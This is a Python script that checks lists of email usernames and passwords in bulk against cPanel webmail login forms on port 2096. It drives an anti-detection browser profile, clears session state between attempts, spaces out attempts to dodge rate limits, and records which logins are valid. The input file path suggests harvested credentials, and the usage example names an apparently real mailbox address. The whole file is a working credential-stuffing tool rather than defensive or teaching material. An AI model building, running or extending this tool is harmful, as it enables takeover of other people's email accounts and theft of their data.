#!/usr/bin/env python3
"""Validate email-server credentials against cPanel webmail (port 2096) login.

Drives a CloakBrowser profile via bdg cloak connect and authenticates against
the cPanel webmail login form (the :2096 interface) that many shared-hosting
mail servers expose. Works for any host serving the standard cPanel
"Webmail Login" form (#user + #pass fields).

Uses the same conventions as other scripts in this directory:
  * bdg CLI via subprocess (CBPM_API_URL / CBPM_API_TOKEN env vars)
  * current_page_signals() to read url/title/body
  * Never echoes passwords to stdout (only the credentials you pass in show)

Usage examples
--------------
Provide a single set of credentials inline:

    export CBPM_API_URL=https://clk.mrme.tech
    export CBPM_API_TOKEN=...            # (from ~/.cbpm/config.json if unset)

    python3 scripts/check_cpanel_webmail_creds.py \\
        --server clouds.server223.com --user jacques@focusconstruction.cd --pass secret

Validate many credentials from a TSV file (server, username, password):

    python3 scripts/check_cpanel_webmail_creds.py \\
        --file /Volumes/Untitled/cookies/data/0809/imap_pop_server_creds.tsv \\
        --profile w --out results.csv

Only cPanel-webmail (2096-style) rows are checked; other rows are skipped
unless --force-all is given (then every row is attempted against :2096).
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
LOGIN_ROOT = "https://{host}:2096/"
LOGIN_TITLE = "webmail login"
INVALID_MARKERS = ("the login is invalid", "login invalid", "invalid login",
                   "incorrect", "authentication failed", "access denied",
                   "wrong password", "invalid username")
SUCCESS_URL_MARKERS = ("/cpsess", "/roundcube", "/3rdparty/", "/mail/",
                       "webmail_client", "/horde", "_task=mail", "cpsubject")
DEFAULT_PROFILE = "w"
DEFAULT_TIMEOUT = 25
SETTLE_SECONDS = 6


def run_bdg(args, json_output=False, check=True):
    cmd = ["bdg", *args]
    if json_output:
        cmd.append("--json")
    result = subprocess.run(cmd, capture_output=True, text=True, check=check)
    if json_output:
        return json.loads(result.stdout)
    return result.stdout


def domeval(expression):
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params",
         json.dumps({"expression": expression, "awaitPromise": False, "returnByValue": True})],
        check=False,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return ""


def current_page_signals():
    expr = ("({ url: window.location.href, title: document.title, "
            "body: document.body ? document.body.innerText.trim().slice(0, 800) : '' })")
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params",
         json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
        check=False,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return {"url": "", "title": "", "body": ""}


def navigate(url, settle=SETTLE_SECONDS):
    run_bdg(["cdp", "Page.navigate", "--params", json.dumps({"url": url})], check=False)
    time.sleep(settle)



def capture_html(dump_dir, host, username, tag):
    """Save the current page's HTML to dump_dir for later UI refinement."""
    if not dump_dir:
        return ""
    try:
        raw = run_bdg(
            ["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": "document.documentElement ? document.documentElement.outerHTML : ''",
                         "returnByValue": True})],
            check=False,
        )
        html = json.loads(raw)["data"]["result"]["result"]["value"] or ""
    except Exception:
        html = ""
    if not html:
        return ""
    os.makedirs(dump_dir, exist_ok=True)
    safe_host = re.sub(r"[^A-Za-z0-9._-]", "_", host)
    safe_user = re.sub(r"[^A-Za-z0-9._@-]", "_", username)[:40]
    fname = f"{safe_host}__{safe_user}__{tag}.html"
    with open(os.path.join(dump_dir, fname), "w", encoding="utf-8") as fh:
        meta = {"url": domeval("location.href"), "title": domeval("document.title")}
        fh.write("<!-- captured_at=" + time.strftime("%Y-%m-%dT%H:%M:%S")
                 + " doc=" + json.dumps(meta) + " -->\n")
        fh.write(html)
    return fname


def fill_field(selector, value):
    sel = selector.lstrip("#")
    expr = f"""
(() => {{
  let el = document.querySelector({json.dumps(selector)});
  if (!el) el = document.querySelector('[name={json.dumps(sel)}], [id={json.dumps(sel)}]');
  if (!el) throw new Error('Element not found: ' + {json.dumps(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  el.focus();
  setter.call(el, {json.dumps(value)});
  el.dispatchEvent(new Event('input', {{ bubbles: true }}));
  el.dispatchEvent(new Event('change', {{ bubbles: true }}));
  el.blur();
  return el.value;
}})()
"""
    run_bdg(["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
            check=False)



def has_login_form():
    """Return True if the standard cPanel #user / #pass login form is present."""
    expr = ("(() => { const u = document.querySelector('#user'); "
            "const p = document.querySelector('#pass'); "
            "return (u && p) ? 'yes' : 'no'; })()")
    return domeval(expr).strip().lower() == "yes"


def wait_for_form(timeout=15.0, poll=0.5):
    """Poll until the #user/#pass login form is present, or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if has_login_form():
            return True
        time.sleep(poll)
    return False


def submit_login():
    """Submit the cPanel login form.

    Strategy (most reliable first):
      1. Click the form's submit button (button[type=submit], input[type=submit],
         or a button whose text matches /log\\s*in/i).
      2. If no button is found, press Enter on the #pass field via bdg's native
         pressKey (much more reliable than manually dispatching KeyboardEvent).
    """
    clicked = domeval("""(() => {
      const f = document.querySelector('#login_form') || document;
      const b = f.querySelector('button[type=submit]')
        || f.querySelector('input[type=submit]')
        || f.querySelector('button.login_button')
        || Array.from(f.querySelectorAll('button')).find(x => /log\\s*in/i.test(x.textContent || ''));
      if (b) { b.click(); return 'clicked'; }
      return 'no-button';
    })()""")
    if clicked.strip() == "clicked":
        time.sleep(SETTLE_SECONDS)
        return "button"
    # No button found -- press Enter on the password field.
    try:
        run_bdg(["dom", "pressKey", "#pass", "Enter"], check=False)
    except Exception:
        pass
    time.sleep(SETTLE_SECONDS)
    return "enter"


def clear_session():
    run_bdg(["cdp", "Network.clearBrowserCookies"], check=False)
    clear_storage = ("(() => { try { localStorage.clear(); } catch (e) {} "
                     "try { sessionStorage.clear(); } catch (e) {} "
                     "return 'cleared'; })()")
    run_bdg(["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": clear_storage, "awaitPromise": False, "returnByValue": True})],
            check=False)

def is_valid_login(method, signals):
    """Decide whether the current page indicates a successful login."""
    url = (signals.get("url") or "").lower()
    title = (signals.get("title") or "").lower()
    body = (signals.get("body") or "").lower()

    # Clear failure markers take precedence.
    for marker in INVALID_MARKERS:
        if marker in body:
            return False
    # Still on the bare login form (no session URL) => failure.
    if "/cpsess" not in url and title == LOGIN_TITLE:
        return False
    # A successful login redirects to a sessionized webmail URL.
    if any(m in url for m in SUCCESS_URL_MARKERS):
        return True
    # Landed on a webmail client frame (title changed away from the login page).
    if title and title != LOGIN_TITLE and "/cpsess" in url:
        return True
    return False


def check_one(host, username, password, profile, timeout, dump_dir=None):
    """Check one credential against host:2096. Returns (status, detail)."""
    clear_session()
    navigate(LOGIN_ROOT.format(host=host), settle=3)

    # Wait for the standard #user/#pass login form. A successful cPanel login
    # page reliably exposes these two fields, so form presence is a stronger
    # signal than the page <title> (which can lag a moment behind the DOM).
    if not wait_for_form(timeout=timeout):
        sig = current_page_signals()
        capture_html(dump_dir, host, username, "noform")
        return "not_2096", sig.get("title", "") or "no login form"

    # The form is present; confirm we're on the expected login page (allow a
    # brief extra settle for the title/DOM to finish rendering).
    time.sleep(1)
    sig = current_page_signals()
    title = (sig.get("title") or "").lower()
    if title not in (LOGIN_TITLE, host.lower()) and not has_login_form():
        capture_html(dump_dir, host, username, "not2096")
        return "not_2096", sig.get("title", "")

    # The cPanel login usually wants the full email address; some hosts accept
    # the bare local part. Try the full address first, then the local part.
    local = username.split("@", 1)[0] if "@" in username else username
    attempts = [username] if local == username else [username, local]

    for user in attempts:
        fill_field("#user", user)
        fill_field("#pass", password)
        submit_method = submit_login()
        sig = current_page_signals()
        if is_valid_login("2096", sig):
            capture_html(dump_dir, host, username, "valid")
            return "valid", {"user_used": user, "url": sig.get("url", ""),
                             "submit": submit_method}
        # Capture the rejected login page for later UI refinement.
        capture_html(dump_dir, host, username, "invalid")
        # If the login page rejected us, stop trying variants.
        if (sig.get("title") or "").lower() == LOGIN_TITLE:
            break

    return "invalid", sig.get("title", "")


def load_creds_tsv(path):
    """Load (server, username, password) rows from a TSV with a header."""
    rows = []
    if not os.path.exists(path):
        return rows
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for i, raw in enumerate(fh):
            line = raw.rstrip("\n")
            if not line.strip():
                continue
            parts = line.split("\t")
            if i == 0 and parts[0].strip().lower() in ("protocol", "server", "host"):
                continue  # header
            if len(parts) >= 4:
                server = parts[1].strip()
                username = parts[2].strip()
                password = parts[3].strip()
            elif len(parts) == 3:
                server, username, password = (p.strip() for p in parts)
            else:
                continue
            if server and username:
                rows.append((server, username, password))
    return rows


def main():
    parser = argparse.ArgumentParser(
        description="Validate email creds against cPanel webmail (port 2096) login"
    )
    parser.add_argument("--server", help="Mail server host (checked against :2096)")
    parser.add_argument("--user", help="Email username")
    parser.add_argument("--pass", dest="password", help="Email password")
    parser.add_argument("--file", type=str, help="TSV file of creds (server, username, password)")
    parser.add_argument("--profile", default=DEFAULT_PROFILE, help="CBM profile (default: %(default)s)")
    parser.add_argument("--out", default="", help="Write results to this CSV file")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="Per-attempt timeout")
    parser.add_argument("--delay", type=float, default=2.0, help="Seconds to wait between credentials (reduce rate-limiting)")
    parser.add_argument("--force-all", action="store_true",
                        help="Attempt every file row against :2096 even if protocol != webmail")
    parser.add_argument("--html-dump", default="",
                        help="Directory to save each page HTML for later UI refinement")
    args = parser.parse_args()

    if args.server and args.user and args.password:
        creds = [(args.server, args.user, args.password)]
    elif args.file:
        creds = load_creds_tsv(args.file)
        if not args.force_all:
            # Keep only rows whose protocol is webmail (or blank/unknown).
            filtered = []
            with open(args.file, encoding="utf-8", errors="ignore") as fh:
                lines = fh.read().splitlines()
            for i, row in enumerate(creds):
                proto = lines[i + 1].split("\t")[0].strip().lower() if i + 1 < len(lines) else "webmail"
                if proto in ("webmail", "", "unknown"):
                    filtered.append(row)
            creds = filtered
    else:
        parser.error("Provide --server/--user/--pass OR --file")

    if not creds:
        print("No credentials to check.", file=sys.stderr)
        return 1

    print(f"Checking {len(creds)} credential(s) against cPanel webmail (:2096) via profile '{args.profile}' ...")

    # Connect bdg to the CloakBrowser profile.
    try:
        run_bdg(["cloak", "connect", args.profile, "about:blank"], json_output=False, check=True)
    except subprocess.CalledProcessError as exc:
        print(f"Could not connect to profile '{args.profile}': {exc}", file=sys.stderr)
        return 1
    time.sleep(4)

    results = []
    for i, (server, username, password) in enumerate(creds, start=1):
        print(f"[{i}/{len(creds)}] {server} / {username} ...", flush=True)
        try:
            status, detail = check_one(server, username, password, args.profile, args.timeout, args.html_dump)
        except Exception as exc:
            status, detail = "error", f"{type(exc).__name__}: {exc}"
        results.append((server, username, status, detail))
        print(f"    -> {status}" + (f" ({detail})" if detail else ""))
        if i < len(creds):
            time.sleep(args.delay)

    print("\n=== Summary ===")
    for server, username, status, detail in results:
        print(f"{status.upper():8} {server:40} {username}")

    if args.html_dump:
        print(f"HTML snapshots saved to: {args.html_dump}")

    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write("server,username,status,detail\n")
            for server, username, status, detail in results:
                fh.write(f"{server},{username},{status},{detail}\n")
        print(f"Results written to {args.out}")

    return 0 if any(s == "valid" for _, _, s, _ in results) else 0


if __name__ == "__main__":
    sys.exit(main())
